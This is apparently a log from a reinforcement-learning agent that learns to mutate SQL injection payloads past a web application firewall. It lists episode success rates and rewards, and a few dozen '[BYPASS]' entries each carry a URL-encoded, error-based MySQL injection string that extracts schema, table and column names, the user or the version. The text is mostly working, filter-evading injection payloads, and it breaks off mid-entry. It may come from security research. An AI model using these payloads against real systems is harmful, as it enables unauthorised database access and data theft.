+  [BYPASS] Ep 4315 | steps=11 | seq=hex_to_char -> agg_swap -> case -> crlf -> case -> func_sp_nl -> case -> case -> func_sp_nl -> case -> null_byte
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SeleCt%0d%0a*%0d%0afROM%0d%0a(sELeCT%0d%0a((seLect%0d%0aJSON_ARRAYAGG(conCaT(taBLE_schema,CHAR(46),TABlE_name))%0d%0afRom%0d%0a
+  Ep 4320 | SR=10% | Steps=14.6 | R=-32.79
+  Ep 4330 | SR=0% | Steps=15.0 | R=-35.44
+  Ep 4340 | SR=0% | Steps=15.0 | R=-36.55
+  Ep 4350 | SR=0% | Steps=15.0 | R=-36.26
+  [BYPASS] Ep 4355 | steps=13 | seq=null_byte -> crlf -> null_byte -> case -> hex_to_char -> case -> case -> func_sp_nl -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELECt%0d%0a*%0d%0afroM%0d%0a(SelecT%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(CONCAT(tabLE_schema,CHAR(46),tAbLE_name))%0d%0aFrOM%0d%0a
+  [BYPASS] Ep 4357 | steps=8 | seq=null_byte -> crlf -> case -> case -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aand%0d%0aGTID_SUBSET((DaTabaSE%a0()),1);%00
+  Ep 4360 | SR=20% | Steps=14.1 | R=-31.43
+  Ep 4370 | SR=0% | Steps=15.0 | R=-36.53
+  Ep 4380 | SR=0% | Steps=15.0 | R=-36.60
+  Ep 4390 | SR=0% | Steps=15.0 | R=-37.09
+  Ep 4400 | SR=0% | Steps=15.0 | R=-35.49
+  [BYPASS] Ep 4407 | steps=5 | seq=null_byte -> agg_swap -> null_byte -> crlf -> case
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELecT%0d%0a*%0d%0aFrOM%0d%0a(sELECT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aInfoRmatIon_SCheMA.schemata))
+  Ep 4410 | SR=10% | Steps=14.0 | R=-33.47
+  Ep 4420 | SR=0% | Steps=15.0 | R=-36.76
+  [BYPASS] Ep 4430 | steps=5 | seq=null_byte -> crlf -> case -> case -> agg_swap
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElect%0d%0a*%0d%0aFrOm%0d%0a(SeLECT%0d%0a((SeleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aINformatION_sChEmA.schemata))
+  Ep 4430 | SR=10% | Steps=14.0 | R=-32.66
+  Ep 4440 | SR=0% | Steps=15.0 | R=-36.05
+  Ep 4450 | SR=0% | Steps=15.0 | R=-37.85
+  [BYPASS] Ep 4456 | steps=15 | seq=null_byte -> crlf -> case -> hex_to_char -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(seLEct%0d%0a*%0d%0afrom%0d%0a(SELEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(CONCAT(TAbLe_schema,CHAR(46),taBLe_name))%0d%0afrOM%0d%0a
+  Ep 4460 | SR=10% | Steps=15.0 | R=-34.78
+  [BYPASS] Ep 4468 | steps=4 | seq=agg_swap -> null_byte -> crlf -> case
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0afroM%0d%0a(sElEct%0d%0a((sElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0ainFOrMAtIoN_SchEMA.schemata))
+  Ep 4470 | SR=10% | Steps=13.9 | R=-30.04
+  [BYPASS] Ep 4479 | steps=11 | seq=case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOM%0d%0a(SElECt%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),tabLe_name))%0d%0afRom%0d%0a
+  Ep 4480 | SR=10% | Steps=14.6 | R=-34.01
+  Ep 4490 | SR=0% | Steps=15.0 | R=-35.82
+  [BYPASS] Ep 4492 | steps=10 | seq=null_byte -> crlf -> case -> case -> case -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFRom%0d%0a(SeLECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNfOrMAtION_scHema.schemata))
+  Ep 4500 | SR=10% | Steps=14.5 | R=-33.32
+  Ep 4510 | SR=0% | Steps=15.0 | R=-36.50
+  Ep 4520 | SR=0% | Steps=15.0 | R=-34.82
+  Ep 4530 | SR=0% | Steps=15.0 | R=-34.65
+  Ep 4540 | SR=0% | Steps=15.0 | R=-36.19
+  Ep 4550 | SR=0% | Steps=15.0 | R=-36.13
+  Ep 4560 | SR=0% | Steps=15.0 | R=-36.38
+  [BYPASS] Ep 4562 | steps=9 | seq=null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SelEct%0d%0a*%0d%0afrOm%0d%0a(selecT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CONCAT(taBLe_schema,CHAR(46),tABlE_name))%0d%0aFrOm%0d%0a
+  Ep 4570 | SR=10% | Steps=14.4 | R=-32.68
+  [BYPASS] Ep 4580 | steps=4 | seq=agg_swap -> null_byte -> crlf -> case
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SeLECt%0d%0a*%0d%0aFRoM%0d%0a(sELECt%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNFOrMATioN_SChEmA.schemata))
+  Ep 4580 | SR=10% | Steps=13.9 | R=-31.88
+  Ep 4590 | SR=0% | Steps=15.0 | R=-33.85
+  Ep 4600 | SR=0% | Steps=15.0 | R=-35.06
+  [BYPASS] Ep 4602 | steps=5 | seq=null_byte -> crlf -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aANd%0d%0aGTID_SUBSET((user%a0()),1);%00
+  Ep 4610 | SR=10% | Steps=14.0 | R=-32.11
+  Ep 4620 | SR=0% | Steps=15.0 | R=-35.90
+  Ep 4630 | SR=0% | Steps=15.0 | R=-36.83
+  Ep 4640 | SR=0% | Steps=15.0 | R=-36.14
+  Ep 4650 | SR=0% | Steps=15.0 | R=-36.15
+  [BYPASS] Ep 4652 | steps=5 | seq=null_byte -> crlf -> hex_to_char -> case -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELeCT%0d%0a*%0d%0afrom%0d%0a(SeLEct%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(CONCAT(taBLE_schema,CHAR(46),TaBlE_name))%0d%0afROM%0d%0a
+  Ep 4660 | SR=10% | Steps=14.0 | R=-32.79
+  Ep 4670 | SR=0% | Steps=15.0 | R=-35.68
+  [BYPASS] Ep 4672 | steps=13 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SELECt%0d%0a*%0d%0afRoM%0d%0a(seLECT%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(column_name)%0d%0afRom%0d%0aINfORmAtIon_SCHeMA.columns%0d
+  Ep 4680 | SR=10% | Steps=14.8 | R=-33.40
+  [BYPASS] Ep 4683 | steps=6 | seq=null_byte -> crlf -> hex_to_char -> case -> case -> agg_swap
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SeLECt%0d%0a*%0d%0aFRom%0d%0a(SELEct%0d%0a((selECt%0d%0aJSON_ARRAYAGG(CONCAT(table_schema,CHAR(46),tAbLe_name))%0d%0aFrOm%0d%0a
+  Ep 4690 | SR=10% | Steps=14.1 | R=-31.36
+  [BYPASS] Ep 4693 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFroM%0d%0a(SELEcT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(CONCat(TABlE_schema,CHAR(46),TaBLE_name))%0d%0aFROm%0d%0a
+  Ep 4700 | SR=10% | Steps=14.1 | R=-31.84
+  [BYPASS] Ep 4705 | steps=7 | seq=null_byte -> case -> func_sp_ff -> agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SELeCT%0d%0a*%0d%0afROM%0d%0a(sElEct%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0aINfOrMaTion_SchEma.schemata))
+  Ep 4710 | SR=10% | Steps=14.2 | R=-31.47
+  Ep 4720 | SR=0% | Steps=15.0 | R=-35.45
+  Ep 4730 | SR=0% | Steps=15.0 | R=-36.38
+  [BYPASS] Ep 4734 | steps=5 | seq=agg_swap -> null_byte -> crlf -> hex_to_char -> case
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFRom%0d%0a(SEleCT%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(CoNCaT(TAblE_schema,CHAR(46),TAblE_name))%0d%0afRoM%0d%0a
+  Ep 4740 | SR=10% | Steps=14.0 | R=-32.01
+  Ep 4750 | SR=0% | Steps=15.0 | R=-37.14
+  Ep 4760 | SR=0% | Steps=15.0 | R=-36.97
+  Ep 4770 | SR=0% | Steps=15.0 | R=-34.69
+  Ep 4780 | SR=0% | Steps=15.0 | R=-34.24
+  [BYPASS] Ep 4785 | steps=5 | seq=case -> agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFrom%0d%0a(sElect%0d%0a((sELEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aInFormAtIon_SchEMA.schemata))
+  Ep 4790 | SR=10% | Steps=14.0 | R=-31.71
+  [BYPASS] Ep 4792 | steps=5 | seq=null_byte -> crlf -> case -> hex_to_char -> agg_swap
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sElEct%0d%0a*%0d%0afrOM%0d%0a(SELecT%0d%0a((sEleCt%0d%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),tAbLE_name))%0d%0afROm%0d%0a
+  Ep 4800 | SR=10% | Steps=14.0 | R=-32.17
+  Ep 4810 | SR=0% | Steps=15.0 | R=-37.37
+  [BYPASS] Ep 4815 | steps=12 | seq=null_byte -> crlf -> case -> case -> agg_swap -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((user%a0()),1);%00
+  Ep 4820 | SR=10% | Steps=14.7 | R=-34.51
+  Ep 4830 | SR=0% | Steps=15.0 | R=-35.31
+  Ep 4840 | SR=0% | Steps=15.0 | R=-34.19
+  Ep 4850 | SR=0% | Steps=15.0 | R=-34.00
+  Ep 4860 | SR=0% | Steps=15.0 | R=-36.39
+  Ep 4870 | SR=0% | Steps=15.0 | R=-34.99
+  Ep 4880 | SR=0% | Steps=15.0 | R=-35.41
+  Ep 4890 | SR=0% | Steps=15.0 | R=-36.25
+  Ep 4900 | SR=0% | Steps=15.0 | R=-34.16
+  [BYPASS] Ep 4904 | steps=9 | seq=null_byte -> crlf -> case -> hex_to_char -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aANd%0d%0aEXP(~(seLEcT%0d%0a*%0d%0aFROM%0d%0a(sELECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(CONCAT(taBle_schema,CHAR(46),tAblE_name))%0d%0afRoM%0d%0a
+  Ep 4910 | SR=10% | Steps=14.4 | R=-30.84
+  Ep 4920 | SR=0% | Steps=15.0 | R=-35.74
+  Ep 4930 | SR=0% | Steps=15.0 | R=-36.05
+  Ep 4940 | SR=0% | Steps=15.0 | R=-35.33
+  Ep 4950 | SR=0% | Steps=15.0 | R=-36.13
+  Ep 4960 | SR=0% | Steps=15.0 | R=-36.59
+  Ep 4970 | SR=0% | Steps=15.0 | R=-36.05
+  Ep 4980 | SR=0% | Steps=15.0 | R=-35.40
+  Ep 4990 | SR=0% | Steps=15.0 | R=-35.24
+  Ep 5000 | SR=0% | Steps=15.0 | R=-35.67
+  Ep 5010 | SR=0% | Steps=15.0 | R=-35.28
+  Ep 5020 | SR=0% | Steps=15.0 | R=-33.98
+  Ep 5030 | SR=0% | Steps=15.0 | R=-35.96
+  [BYPASS] Ep 5034 | steps=9 | seq=null_byte -> crlf -> case -> case -> hex_to_char -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELECT%0d%0a*%0d%0afrom%0d%0a(SELEcT%0d%0a((SElect%0d%0aJSON_ARRAYAGG(CONCAT(TablE_schema,CHAR(46),taBLE_name))%0d%0afRoM%0d%0a
+  [BYPASS] Ep 5035 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0afroM%0d%0a(sELECT%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0ainformATiOn_SchEma.schemata))
+  [BYPASS] Ep 5039 | steps=8 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAND%0d%0aEXP(~(selecT%0d%0a*%0d%0aFroM%0d%0a(SeLEct%0d%0a(user%a0()))a));%00
+  Ep 5040 | SR=30% | Steps=12.6 | R=-25.62
+  Ep 5050 | SR=0% | Steps=15.0 | R=-35.86
+  [BYPASS] Ep 5055 | steps=11 | seq=case -> case -> case -> null_byte -> crlf -> case -> case -> case -> func_sp_nl -> func_sp_nl -> agg_swap
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sElEcT%0d%0a*%0d%0aFROm%0d%0a(SElEcT%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0ainFOrMATiON_SChEMA.schemata))
+  Ep 5060 | SR=10% | Steps=14.6 | R=-33.56
+  [BYPASS] Ep 5061 | steps=9 | seq=null_byte -> null_byte -> crlf -> case -> hex_to_char -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElECT%0d%0a*%0d%0aFRom%0d%0a(SeLect%0d%0a((SElect%0d%0aJSON_ARRAYAGG(CONCAT(tAblE_schema,CHAR(46),TabLe_name))%0d%0afrOM%0d%0a
+  Ep 5070 | SR=10% | Steps=14.4 | R=-31.43
+  Ep 5080 | SR=0% | Steps=15.0 | R=-37.09
+  Ep 5090 | SR=0% | Steps=15.0 | R=-34.23
+  Ep 5100 | SR=0% | Steps=15.0 | R=-36.62
+  [BYPASS] Ep 5108 | steps=5 | seq=case -> agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afroM%0d%0a(SElECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNForMatiOn_ScHeMA.schemata))
+  Ep 5110 | SR=10% | Steps=14.0 | R=-31.66
+  Ep 5120 | SR=0% | Steps=15.0 | R=-35.26
+  Ep 5130 | SR=0% | Steps=15.0 | R=-34.49
+  Ep 5140 | SR=0% | Steps=15.0 | R=-35.89
+  Ep 5150 | SR=0% | Steps=15.0 | R=-34.58
+  Ep 5160 | SR=0% | Steps=15.0 | R=-36.81
+  Ep 5170 | SR=0% | Steps=15.0 | R=-35.62
+  Ep 5180 | SR=0% | Steps=15.0 | R=-35.71
+  Ep 5190 | SR=0% | Steps=15.0 | R=-36.33
+  Ep 5200 | SR=0% | Steps=15.0 | R=-35.84
+  Ep 5210 | SR=0% | Steps=15.0 | R=-36.88
+  Ep 5220 | SR=0% | Steps=15.0 | R=-35.86
+  [BYPASS] Ep 5223 | steps=8 | seq=case -> case -> null_byte -> crlf -> case -> hex_to_char -> case -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFrOm%0d%0a(seLeCT%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),taBLe_name))%0d%0afroM%0d%0a
+  Ep 5230 | SR=10% | Steps=14.3 | R=-31.37
+  Ep 5240 | SR=0% | Steps=15.0 | R=-35.91
+  Ep 5250 | SR=0% | Steps=15.0 | R=-36.03
+  Ep 5260 | SR=0% | Steps=15.0 | R=-35.98
+  Ep 5270 | SR=0% | Steps=15.0 | R=-36.39
+  Ep 5280 | SR=0% | Steps=15.0 | R=-36.89
+  [BYPASS] Ep 5283 | steps=10 | seq=case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFroM%0d%0a(SeLEct%0d%0a((sELeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aiNFoRmAtioN_ScHEMA.schemata))
+  Ep 5290 | SR=10% | Steps=14.5 | R=-32.78
+  Ep 5300 | SR=0% | Steps=15.0 | R=-36.09
+  Ep 5310 | SR=0% | Steps=15.0 | R=-36.33
+  Ep 5320 | SR=0% | Steps=15.0 | R=-34.89
+  Ep 5330 | SR=0% | Steps=15.0 | R=-36.37
+  Ep 5340 | SR=0% | Steps=15.0 | R=-35.54
+  Ep 5350 | SR=0% | Steps=15.0 | R=-35.29
+  [BYPASS] Ep 5360 | steps=5 | seq=case -> null_byte -> crlf -> case -> func_sp_nbsp
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SElect%0d%0a*%0d%0aFROm%0d%0a(seLECt%0d%0a(user%a0()))a));%00
+  Ep 5360 | SR=10% | Steps=14.0 | R=-31.79
+  Ep 5370 | SR=0% | Steps=15.0 | R=-34.88
+  Ep 5380 | SR=0% | Steps=15.0 | R=-36.13
+  Ep 5390 | SR=0% | Steps=15.0 | R=-36.19
+  [BYPASS] Ep 5392 | steps=5 | seq=null_byte -> crlf -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((version%a0()),1);%00
+  Ep 5400 | SR=10% | Steps=14.0 | R=-31.82
+  Ep 5410 | SR=0% | Steps=15.0 | R=-34.96
+  Ep 5420 | SR=0% | Steps=15.0 | R=-35.65
+  Ep 5430 | SR=0% | Steps=15.0 | R=-35.48
+  Ep 5440 | SR=0% | Steps=15.0 | R=-36.65
+  [BYPASS] Ep 5446 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFROM%0d%0a(sELect%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aiNformaTioN_ScHEma.schemata))
+  Ep 5450 | SR=10% | Steps=13.9 | R=-30.73
+  Ep 5460 | SR=0% | Steps=15.0 | R=-36.05
+  Ep 5470 | SR=0% | Steps=15.0 | R=-34.60
+  Ep 5480 | SR=0% | Steps=15.0 | R=-34.47
+  Ep 5490 | SR=0% | Steps=15.0 | R=-34.94
+  Ep 5500 | SR=0% | Steps=15.0 | R=-35.58
+  Ep 5510 | SR=0% | Steps=15.0 | R=-36.36
+  Ep 5520 | SR=0% | Steps=15.0 | R=-35.89
+  Ep 5530 | SR=0% | Steps=15.0 | R=-36.37
+  Ep 5540 | SR=0% | Steps=15.0 | R=-35.69
+  Ep 5550 | SR=0% | Steps=15.0 | R=-36.27
+  Ep 5560 | SR=0% | Steps=15.0 | R=-34.11
+  Ep 5570 | SR=0% | Steps=15.0 | R=-34.46
+  [BYPASS] Ep 5572 | steps=6 | seq=case -> null_byte -> crlf -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((user%a0()),1);%00
+  Ep 5580 | SR=10% | Steps=14.1 | R=-30.55
+  Ep 5590 | SR=0% | Steps=15.0 | R=-35.74
+  [BYPASS] Ep 5595 | steps=14 | seq=null_byte -> crlf -> case -> case -> case -> case -> hex_to_char -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aaNd%0d%0aGTID_SUBSET((user%a0()),1);%00
+  [BYPASS] Ep 5598 | steps=6 | seq=null_byte -> crlf -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aaNd%0d%0aGTID_SUBSET((version%a0()),1);%00
+  Ep 5600 | SR=20% | Steps=14.0 | R=-30.52
+  Ep 5610 | SR=0% | Steps=15.0 | R=-34.95
+  Ep 5620 | SR=0% | Steps=15.0 | R=-36.13
+  Ep 5630 | SR=0% | Steps=15.0 | R=-35.89
+  Ep 5640 | SR=0% | Steps=15.0 | R=-35.51
+  Ep 5650 | SR=0% | Steps=15.0 | R=-35.56
+  [BYPASS] Ep 5652 | steps=4 | seq=func_sp_nbsp -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aGTID_SUBSET((user%a0()),1);%00
+  Ep 5660 | SR=10% | Steps=13.9 | R=-30.22
+  Ep 5670 | SR=0% | Steps=15.0 | R=-36.11
+  Ep 5680 | SR=0% | Steps=15.0 | R=-35.78
+  Ep 5690 | SR=0% | Steps=15.0 | R=-36.25
+  Ep 5700 | SR=0% | Steps=15.0 | R=-35.44
+  Ep 5710 | SR=0% | Steps=15.0 | R=-35.46
+  Ep 5720 | SR=0% | Steps=15.0 | R=-33.53
+  Ep 5730 | SR=0% | Steps=15.0 | R=-35.63
+  [BYPASS] Ep 5731 | steps=5 | seq=case -> agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sElECt%0d%0a*%0d%0aFROm%0d%0a(SELECt%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aINFoRmatiOn_SchEma.schemata))
+  Ep 5740 | SR=10% | Steps=14.0 | R=-32.13
+  Ep 5750 | SR=0% | Steps=15.0 | R=-33.58
+  Ep 5760 | SR=0% | Steps=15.0 | R=-36.97
+  Ep 5770 | SR=0% | Steps=15.0 | R=-33.19
+  Ep 5780 | SR=0% | Steps=15.0 | R=-35.73
+  Ep 5790 | SR=0% | Steps=15.0 | R=-33.77
+  Ep 5800 | SR=0% | Steps=15.0 | R=-35.90
+  Ep 5810 | SR=0% | Steps=15.0 | R=-34.06
+  [BYPASS] Ep 5811 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afRoM%0d%0a(seleCT%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(concat(tABLE_schema,CHAR(46),tabLE_name))%0d%0afrom%0d%0a
+  Ep 5820 | SR=10% | Steps=14.0 | R=-30.54
+  Ep 5830 | SR=0% | Steps=15.0 | R=-35.04
+  Ep 5840 | SR=0% | Steps=15.0 | R=-35.22
+  Ep 5850 | SR=0% | Steps=15.0 | R=-36.15
+  Ep 5860 | SR=0% | Steps=15.0 | R=-35.00
+  [BYPASS] Ep 5865 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SelecT%0d%0a*%0d%0aFROm%0d%0a(sELeCt%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aiNFormATiON_sChEMA.schemata))
+  Ep 5870 | SR=10% | Steps=13.9 | R=-30.28
+  Ep 5880 | SR=0% | Steps=15.0 | R=-35.40
+  Ep 5890 | SR=0% | Steps=15.0 | R=-35.46
+  Ep 5900 | SR=0% | Steps=15.0 | R=-35.49
+  Ep 5910 | SR=0% | Steps=15.0 | R=-34.05
+  Ep 5920 | SR=0% | Steps=15.0 | R=-35.37
+  [BYPASS] Ep 5930 | steps=6 | seq=case -> null_byte -> crlf -> case -> case -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFRoM%0d%0a(sELect%0d%0a((seLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aInforMaTiOn_ScHemA.schemata))
+  Ep 5930 | SR=10% | Steps=14.1 | R=-31.74
+  Ep 5940 | SR=0% | Steps=15.0 | R=-35.44
+  [BYPASS] Ep 5944 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(seLECT%0d%0a*%0d%0afRom%0d%0a(selecT%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNfoRmATION_SchEmA.schemata))
+  [BYPASS] Ep 5945 | steps=12 | seq=case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selEcT%0d%0a*%0d%0afrom%0d%0a(SeLeCT%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(CONCAT(TabLe_schema,CHAR(46),TabLE_name))%0d%0aFroM%0d%0a
+  Ep 5950 | SR=20% | Steps=13.6 | R=-29.37
+  Ep 5960 | SR=0% | Steps=15.0 | R=-34.85
+  Ep 5970 | SR=0% | Steps=15.0 | R=-35.66
+  Ep 5980 | SR=0% | Steps=15.0 | R=-35.76
+  Ep 5990 | SR=0% | Steps=15.0 | R=-36.09
+  Ep 6000 | SR=0% | Steps=15.0 | R=-35.68
+  Ep 6010 | SR=0% | Steps=15.0 | R=-35.63
+  Ep 6020 | SR=0% | Steps=15.0 | R=-35.23
+  [BYPASS] Ep 6024 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(seLeCt%0d%0a*%0d%0aFROm%0d%0a(selECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(COncAt(tABle_schema,CHAR(46),tabLE_name))%0d%0aFrom%0d%0a
+  [BYPASS] Ep 6030 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afRoM%0d%0a(sELEcT%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(ConcaT(tAblE_schema,CHAR(46),tABLE_name))%0d%0aFrOm%0d%0a
+  Ep 6030 | SR=20% | Steps=13.0 | R=-26.84
+  Ep 6040 | SR=0% | Steps=15.0 | R=-35.46
+  Ep 6050 | SR=0% | Steps=15.0 | R=-35.20
+  Ep 6060 | SR=0% | Steps=15.0 | R=-36.03
+  [BYPASS] Ep 6066 | steps=9 | seq=case -> agg_swap -> case -> case -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SELEct%0d%0a*%0d%0aFroM%0d%0a(SEleCt%0d%0a((SElEct%0d%0aJSON_ARRAYAGG(CoNcat(TAble_schema,CHAR(46),TAbLe_name))%0d%0aFRoM%0d%0a
+  Ep 6070 | SR=10% | Steps=14.4 | R=-31.99
+  Ep 6080 | SR=0% | Steps=15.0 | R=-35.89
+  Ep 6090 | SR=0% | Steps=15.0 | R=-36.17
+  Ep 6100 | SR=0% | Steps=15.0 | R=-34.12
+  [BYPASS] Ep 6106 | steps=5 | seq=agg_swap -> hex_to_char -> null_byte -> crlf -> case
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElECt%0d%0a*%0d%0afroM%0d%0a(SeLeCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(ConcaT(tabLE_schema,CHAR(46),TAble_name))%0d%0aFRom%0d%0a
+  Ep 6110 | SR=10% | Steps=14.0 | R=-31.51
+  [BYPASS] Ep 6120 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLECt%0d%0a*%0d%0aFrOm%0d%0a(SElEct%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(CoNCaT(tAblE_schema,CHAR(46),tabLE_name))%0d%0aFROM%0d%0a
+  Ep 6120 | SR=10% | Steps=14.0 | R=-31.65
+  Ep 6130 | SR=0% | Steps=15.0 | R=-34.84
+  Ep 6140 | SR=0% | Steps=15.0 | R=-35.97
+  [BYPASS] Ep 6145 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SeleCT%0d%0a*%0d%0afROM%0d%0a(SeLEcT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(ConCaT(tabLe_schema,CHAR(46),tAblE_name))%0d%0aFrOM%0d%0a
+  Ep 6150 | SR=10% | Steps=14.0 | R=-29.32
+  [BYPASS] Ep 6153 | steps=13 | seq=case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElECt%0d%0a*%0d%0afRom%0d%0a(selecT%0d%0a((SELEcT%0d%0aJSON_ARRAYAGG(CONCAT(Table_schema,CHAR(46),tablE_name))%0d%0afROM%0d%0a
+  Ep 6160 | SR=10% | Steps=14.8 | R=-33.66
+  Ep 6170 | SR=0% | Steps=15.0 | R=-36.49
+  Ep 6180 | SR=0% | Steps=15.0 | R=-32.72
+  Ep 6190 | SR=0% | Steps=15.0 | R=-35.73
+  [BYPASS] Ep 6195 | steps=14 | seq=case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
